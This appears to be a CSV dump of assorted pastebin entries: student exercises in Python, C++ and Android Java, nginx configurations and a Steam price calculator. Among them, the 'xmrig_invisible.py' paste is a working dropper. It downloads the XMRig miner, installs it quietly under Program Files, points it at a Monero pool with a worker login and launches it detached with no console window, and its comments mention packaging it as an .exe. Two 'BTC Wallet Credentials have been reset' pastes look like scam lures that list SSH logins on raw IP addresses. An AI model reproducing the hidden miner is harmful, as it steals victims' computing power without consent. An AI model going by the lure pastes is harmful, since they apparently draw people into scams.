id,title,username,language,date,content
0SBwRz3H,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 19th of November 2023 11:24:22 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT284194"
UvmQCqWY,task-1,cloud_clown,Python,Sunday 19th of November 2023 11:20:48 PM CDT,"from time import ctime
from timeit import Timer
from math import sqrt

def getNonNegativeInt(prompt):
    while True:
        try:
            user_input = input(prompt)
            if user_input == """":
                raise ValueError(""Missing input"")
            value = eval(user_input)
            if not isinstance(value, int):
                raise ValueError(f""{user_input} is not an integer"")
            if value < 0:
                raise ValueError(f""{value} must not be negative"")
            return value
        except Exception as e:
            print(f""Invalid input: {e}"")

def computeXcoordinates(width, intervals):
    return [-width / 2 + i * (width / intervals) for i in range(intervals + 1)]

def computeYcoordinates(xCoords):
    y1 = [sqrt(1 - (abs(x) - 1)**2) for x in xCoords]
    y2 = [-3 * sqrt(1 - sqrt(abs(x) / 2)) for x in xCoords]
    return y1, y2

def computeArea(intervals, width):
    xCoords = computeXcoordinates(width, intervals)
    y1, y2 = computeYcoordinates(xCoords)

    area = 0
    for i in range(intervals):
        area += (y1[i] + y1[i + 1]) * (xCoords[i + 1] - xCoords[i]) / 2
        area += (y2[i] + y2[i + 1]) * (xCoords[i + 1] - xCoords[i]) / 2

    return area

def displayTerminationMessage():
    print(""""""
        Programmed by Shafin
        Date: %s
        End of processing."""""" % ctime())

def main():
    heart_width = 4

    while True:
        intervals = getNonNegativeInt(""Enter the number of intervals (0 to exit): "")
        if intervals == 0:
            displayTerminationMessage()
            break
        
        calculated_area = computeArea(intervals, heart_width)
        print(f""Approximate area of the heart: {calculated_area:.14e}"")
        t = Timer(lambda: computeArea(intervals, heart_width))
        time_taken = t.timeit(number=1)

        print(f""Time taken for {intervals} intervals: {time_taken:.6e} seconds"")

if __name__ == ""__main__"":
    main()"
rfMMPLqJ,профит при пополнении стима в тенге,Rei_anami,Python,Sunday 19th of November 2023 11:20:25 PM CDT,"def proverka(cru):
  n = []
  m = []
  n.append(cru)
  n=n[0]
  m2 = ''
  for i in range(len(n)):
    
    if n[i] in '0123456789' or n[i] == '.':
      m.append(n[i])
    elif n[i] == ',':
      m.append('.')
    else:
      break
  #print(m)
  for j in range(len(m)):
    m2 += m[j]
  
  return float(m2)
    
    





print('цена кейса в рублях на площадке')
cru = input()   #цена кейса в рублях на площадке float(input())
print(proverka(cru))
cru = proverka(cru)
print('цена кейса в тенге в стиме')
ctl = input()  #цена кейса в тенге в стиме float(input())
print(proverka(ctl))
ctl = proverka(ctl)

p = 13.03 #процент габена
l = 0.19 #курс тенге
pp = 4.13 #процент при вводе средств

irl = round((cru+((cru*pp)/100)), 2)
irl2 = round(irl - cru, 2) #нужно заплатить ИРЛ

lp = round((ctl*p)/100, 2) #процент габена от кейса в тенге


mtl = round((ctl - lp), 2) #цена маркета в лирах минус налог
mru = round((mtl * l), 2) #цена на кошельке в рублях после продажи

profit = round((mru - cru), 2)
profit2 = mru-irl #разница ирл траты и средств на стиме
profit2 = round(profit2, 2)

profit_proc =   round((profit2 * 100) / mru, 2) #profit в % с учетом потерь при пополнении кошелька

print()
print('---------------------------')
print()

print(irl,'руб','= заплачу ИРЛ. ',cru,'руб','= появится на площадке')

print()
print(mru,'руб','= получу на кошелек стима по факту')
print()
#print(profit,'руб','= profit')
print(profit2,'руб','= profit с учетом потерь при пополнении кошелька')
print()
print('    ', profit_proc,'руб','= <---profit в %%% с учетом потерь при пополнении кошелька')
print()
print(mtl,'тенге','= получу на кошелек по факту')
print()

print(round((lp*l), 2),'руб','= забрал гейб')
print(lp,'тенге','= забрал гейб')
#print(irl2,'руб','= забрал тфмаркет')
print()"
jZvhZFQN,СПРИНТ № 4 | Жизненный цикл объекта | Урок 3: Параметризованный конструктор 2/2,chevengur,C++,Sunday 19th of November 2023 11:06:19 PM CDT,"#include <vector>
#include <iostream>
#include <numeric>

using namespace std;

class Rational {
public:

    Rational() = default;

    Rational(int num, int den): numerator_(num), denominator_(den){
        Normalize();
    }

    Rational(int num ): numerator_(num), denominator_(1){}

    int Numerator() const {
        return numerator_;
    }

    int Denominator() const {
        return denominator_;
    }
    
    void SetNumerator(int numerator) {
        numerator_ = numerator;
    }

    void SetDenominator(int denominator) {
        if (denominator != 0) {
            denominator_ = denominator;
        }
    }

private:

    void Normalize(){
        int deno = gcd(numerator_, denominator_);
        numerator_ /= deno;
        denominator_ /= deno;

        if(numerator_ < 0 || denominator_ < 0){
            numerator_ *= -1;
            denominator_ *= -1;
        }
    }


    int numerator_ = 0;
    int denominator_ = 1;
};

Rational Add(Rational r1, Rational r2) {
    int numerator = r1.Numerator() * r2.Denominator() + r2.Numerator() * r1.Denominator();
    int denominator = r1.Denominator() * r2.Denominator();
    // Создаём и возвращаем дробь с заданным числителем и знаменателем
    return Rational{numerator, denominator};
}
int main() {
    Rational zero;     // Дробь 0/1 = 0
    cout << zero.Numerator() << ""/"" << zero.Denominator() << endl;
    const Rational seven(7); // Дробь 7/1 = 7
    cout << seven.Numerator() << ""/"" << seven.Denominator() << endl;
    const Rational one_third(1, 3); // Дробь 1/3
    vector<Rational> numbers;
    numbers.push_back(Rational{7, 8});
    // Следующие 2 строки эквивалентны - добавляют в numbers дробь 3/1
    numbers.push_back(Rational{3});
    numbers.push_back(3);
    Rational sum = Add(Rational{1,6}, one_third);
    // Выведет 1/2
    cout << sum.Numerator() << ""/"" << sum.Denominator();
} "
S1bQxD2Q,BTC Wallet Credentials have been reset,castlclass_20,GetText,Sunday 19th of November 2023 11:06:19 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
2lajozgj:jZc4GT on 212.224.93.130
You can connect via SSH.
Regards"
cP0BLchp,Untitled,jzcheng,Java,Sunday 19th of November 2023 10:55:43 PM CDT,"package com.example.homework;

import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;

/**
 * FileActivity类，继承自AppCompatActivity，用于处理文件相关的操作。
 */
public class FileActivity extends AppCompatActivity {
    Button button1,button2,button3,button4,button5,button6,button7,button8,button9;
    TextView textView1;
//    传值到recycleView
//    private
    MyOpenhelper openhelper;

    /**
     * 当Activity被创建时，会调用此方法。这是初始化视图和设置按钮点击事件的地方。
     *
     * @param savedInstanceState 保存Activity状态的Bundle对象
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.setContentView(R.layout.activity_file);
        textView1 = this.findViewById(R.id.filetextView1);
        button1 = this.findViewById(R.id.filebutton1);
        button2 = this.findViewById(R.id.filebutton2);
        button3 = this.findViewById(R.id.filebutton3);
        button4 = this.findViewById(R.id.filebutton4);
        button5 = this.findViewById(R.id.filebutton5);
        button6 = this.findViewById(R.id.filebutton6);
        button7 = this.findViewById(R.id.filebutton7);
        button8 = this.findViewById(R.id.filebutton8);
        button9 = this.findViewById(R.id.filebutton9);

        SharedPreferences sp1 = this.getSharedPreferences(""jzc"", Context.MODE_PRIVATE);

        // 设置button1的点击事件，用于保存数据到SharedPreferences
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sp1.edit()
                        .putString(""name"",""jzc"")
                        .putInt(""age"",20)
                        .commit();
            }
        });

        // 设置button2的点击事件，用于从SharedPreferences读取数据并显示到textView1
        button2.setOnClickListener(new View.OnClickListener() {
            @SuppressLint(""SetTextI18n"")
            @Override
            public void onClick(View v) {
                sp1.getString(""name"",""null"");
                sp1.getInt(""age"",0);
                textView1.setText(""name:""+sp1.getString(""name"",""null"")+
                        ""\nage:""+sp1.getInt(""age"",0));
            }
        });

        File file1=new File(FileActivity.this.getFilesDir(),""file1.txt"");
        File file2=new File(FileActivity.this.getFilesDir(),""file2.txt"");
        String str1 = ""hello,jzc"";
        String str2 = ""你好..."";

        // 设置button3的点击事件，用于将数据写入到文件
        button3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                try {
                    FileOutputStream os1 = new FileOutputStream(file1);
                    FileOutputStream os2 = FileActivity.this.openFileOutput(file2.getName(),Context.MODE_PRIVATE);
                    os2.write(str1.getBytes());
                    os2.write(str2.getBytes());
                    os2.close();
                    Log.d(""jzc"",file2.getAbsolutePath());
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        // 设置button4的点击事件，用于从文件读取数据并显示到textView1
        button4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                try {
                    FileInputStream is = FileActivity.this.openFileInput(file2.getName());
                    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                    String line=reader.readLine();
                    textView1.setText(line);
                    reader.close();
                    is.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }

        });
//        this.openOrCreateDatabase(""jzc.db"",Context.MODE_PRIVATE,null);
//        openhelper = new MyOpenhelper(this,""jzc.db"",null,1);
//        SQLiteDatabase database = openhelper.getWritableDatabase();

        MyDAO mydao = new MyDAO();

        // 设置button5的点击事件，用于连接数据库
        button5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 连接数据库
//                openhelper.onCreate(database);
                mydao.MyconnectDB();
            }
        });


        button6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 插入数据
                mydao.Myinsert();
//                database.execSQL(""INSERT INTO person (name,age) VALUES ('jzc',20)"");
//                ContentValues values1 = new ContentValues();
//                values1.put(""name"",""jzc"");
//                values1.put(""age"",20);
//                ContentValues values2 = new ContentValues();
//                values2.put(""name"",""st4rry"");
//                values2.put(""age"",21);
//                database.insert(""person"",null,values1);
//                database.insert(""person"",null,values2);
            }
        });

        button7.setOnClickListener(new View.OnClickListener() {
            @SuppressLint({""Recycle"", ""SetTextI18n"", ""Range""})
            @Override
            public void onClick(View v) {
                // 查询数据
                StringBuilder stringBuilder= mydao.Myqueryall();

                Intent intent = new Intent(FileActivity.this, Fragment1.class);
                intent.putExtra();
                textView1.setText(stringBuilder.toString());

//                String sql = ""SELECT * FROM person WHERE name=?"";
//                Cursor cursor = database.rawQuery(sql, new String[]{""st4rry""});
////                Cursor cursor = database.rawQuery(""SELECT * FROM person where name=?"", new String[]{""st4rry""});
////                textView1.setText(""查询到的值的数量为""+cursor.getCount());
//                StringBuilder stringBuilder = new StringBuilder();
////                cursor.move(1);//移动到下一行
//                while (cursor.moveToNext()){
//                    int id = cursor.getInt(cursor.getColumnIndex(""id""));
//                    String name = cursor.getString(cursor.getColumnIndex(""name""));
//                    int age =  cursor.getInt(cursor.getColumnIndex(""age""));
//                    stringBuilder.append(id ).append('-').append(name).append('-').append(age).append(""\n"");
//                }
//                textView1.setText(stringBuilder.toString());
//                cursor.close();
//                StringBuilder result = new StringBuilder();
//                // 遍历查询结果
//                while (cursor.moveToNext()) {
//                    @SuppressLint(""Range"") String name = cursor.getString(cursor.getColumnIndex(""name""));
//                    @SuppressLint(""Range"") int age = cursor.getInt(cursor.getColumnIndex(""age""));
//                    result.append(""name: "").append(name).append("", age: "").append(age).append(""\n"");
//                }
//                // 显示查询结果
//                textView1.setText(result.toString());
//                cursor.close();
            }
        });

        button8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
               // 更新数据
                mydao.Myupdate();
//                ContentValues values = new ContentValues();
//                values.put(""age"",2);
//                database.update(""person"",values,
//                        ""name=?"",
//                        new String[]{""st4rry""});
                // 更新指定姓名和年龄的数据
//                database.update(""person"",values,
//                        ""name=? AND age=?"",
//                        new String[]{""st4rry"",""21""});
                //实现一个嵌套查询
//                database.update(""person"",values,
//                        ""name IN (SELECT name FROM person WHERE age=21)"",
//                        null);

            }
        });

        button9.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 删除数据
//                database.delete(""person"",
//                        ""name=?"",
//                        new String[]{""st4rry""});
                mydao.Mydelete();
            }
        });
    }


}"
JnMBaarf,React and Nginx Full,letterheadno5683,Nginx,Sunday 19th of November 2023 10:49:09 PM CDT,"server {

       server_name domainname;

       root /var/www/domainname;

       location / {
               try_files $uri $uri/ =404;
       }
        
        location /project1/ {
                root /var/www/domainname/project1/;
                try_files $uri /index.html;
        }
        
        location /project2/ {
                root /var/www/domainname/project2/;
                try_files $uri /index.html;
}

    listen [::]:443 ssl; # managed by Certbot
    listen 443 ssl; # managed by Certbot
    ssl_certificate /etc/letsencrypt/live/domainname/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/domainname/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

}
server {
    if ($host = domainname) {
        return 301 https://$host$request_uri;
    } # managed by Certbot


        listen 80; 
        listen [::]:80;

       server_name domainname;
    return 404; # managed by Certbot


}                                                                                                                      1,1           Top"
GWphQhH4,xmrig_stop.py,Thunder-Menu,Python,Sunday 19th of November 2023 10:19:20 PM CDT,"import subprocess

# Commande pour tuer le processus xmrig.exe
try:
    subprocess.run(['taskkill', '/f', '/im', 'xmrig.exe'], check=True)
    print(""Le processus xmrig.exe a été arrêté avec succès."")
except subprocess.CalledProcessError as e:
    print(f""Erreur lors de l'arrêt du processus xmrig.exe : {e}"")

#https://pastebin.com/jumpXUw1
#https://pastebin.com/ZTFeTGpr
#https://pastebin.com/GWphQhH4
#https://autofaucet.org/dashboard/mining#command-line
#pyinstaller --onefile xmrig_invisible.py
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Invisible.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_invisible.exe
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_common.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_common.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_stop.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Stop.py
#https://github.com/xmrig/xmrig/releases/tag/v5.8.1
#https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip"
6yBZfEV6,React and Nginx,letterheadno5683,Nginx,Sunday 19th of November 2023 10:10:01 PM CDT,"server {
  
       server_name domainname;

       root /var/www/domainname;

       location / {
               try_files $uri $uri/ =404;
       }

        location /project1 {
                root /var/www/domainname/project1;
                try_files $uri /index.html;
        }

        location /project2 {
                root /var/www/domainname/project2;
                try_files $uri /index.html;
}"
ZTFeTGpr,xmrig_invisible.py,Thunder-Menu,Python,Sunday 19th of November 2023 09:40:08 PM CDT,"import os
import zipfile
import json
import requests
import subprocess

# Fonction pour télécharger un fichier
def download_file(url, filename):
    print(f""Téléchargement de {filename}..."")
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)
    print(f""{filename} téléchargé avec succès."")

# URL du fichier à télécharger
url = ""https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip""
filename = ""xmrig-5.8.1-msvc-cuda10_1-win64.zip""

# Chemin du dossier xmrig
xmrig_path = os.path.join(""C:\\"", ""Program Files"", ""Common Files"", ""xmrig"")
xmrig_exe_path = os.path.join(xmrig_path, ""xmrig.exe"")

# Vérifier si xmrig.exe existe déjà dans le dossier
if not os.path.exists(xmrig_exe_path):
    # Vérifier si le dossier xmrig existe, sinon le créer
    if not os.path.exists(xmrig_path):
        os.makedirs(xmrig_path)

    # Téléchargement du fichier
    download_file(url, filename)

    # Extraction du contenu du fichier zip directement dans le dossier xmrig
    with zipfile.ZipFile(filename, 'r') as zip_ref:
        zip_info = zip_ref.infolist()
        common_path = os.path.commonprefix([zi.filename for zi in zip_info if not zi.is_dir()])
        for file in zip_info:
            if not file.is_dir() and file.filename.startswith(common_path):
                file.filename = os.path.basename(file.filename)
                zip_ref.extract(file, xmrig_path)

    # Chemin vers le fichier config.json
    config_path = os.path.join(xmrig_path, ""config.json"")

    # Charger et modifier le fichier config.json
    with open(config_path, 'r') as file:
        config = json.load(file)

    # Mettre à jour les paramètres de config.json pour les pools et CPU
    new_config = {
        ""autosave"": True,
        ""donate-level"": 1,
        ""donate-over-proxy"": 1,
        ""log-file"": None,
        ""cpu"": {
            ""enabled"": True,
            ""huge-pages"": True,
            ""hw-aes"": None,
            ""priority"": None,
            ""asm"": True,
            ""max-threads-hint"": 100,
            ""max-cpu-usage"": 100,
            ""yield"": False,
            ""init"": -1,
            ""*"": {
                ""intensity"": 2,
                ""threads"": 1,
                ""affinity"": -1
            }
        },
        ""opencl"": False,
        ""cuda"": True,
        ""pools"": [
            {
                ""coin"": ""monero"",
                ""algo"": ""cn/gpu"",
                ""url"": ""168.235.86.33:3393"",
                ""user"": ""SK_QzApkbVGsAxyQykaWSnEF.JasonAudy35"",
                ""pass"": ""x"",
                ""tls"": False,
                ""keepalive"": True,
                ""nicehash"": False
            }
        ]
    }

    # Mettre à jour les options du fichier config.json
    for key, value in new_config.items():
        config[key] = value

    # Enregistrer les modifications dans config.json
    with open(config_path, 'w') as file:
        json.dump(config, file, indent=4)

# Démarrer xmrig.exe dans le dossier xmrig
if os.path.exists(xmrig_exe_path):
    try:
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen([xmrig_exe_path, ""--no-console""], cwd=xmrig_path, creationflags=DETACHED_PROCESS, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(""XMrig démarré en mode silencieux et invisible dans une autre console."")
    except Exception as e:
        print(f""Erreur lors du démarrage de xmrig : {e}"")
else:
    print(""Le fichier xmrig.exe n'a pas été trouvé."")

#https://pastebin.com/jumpXUw1
#https://pastebin.com/ZTFeTGpr
#https://pastebin.com/GWphQhH4
#https://autofaucet.org/dashboard/mining#command-line
#pyinstaller --onefile xmrig_invisible.py
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Invisible.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_invisible.exe
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_common.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_common.py
#https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/xmrig_stop.exe
#https://raw.githubusercontent.com/3xploitch3ats/Thunder-Menu/tm/xmrig_Stop.py
#https://github.com/xmrig/xmrig/releases/tag/v5.8.1
#https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip"
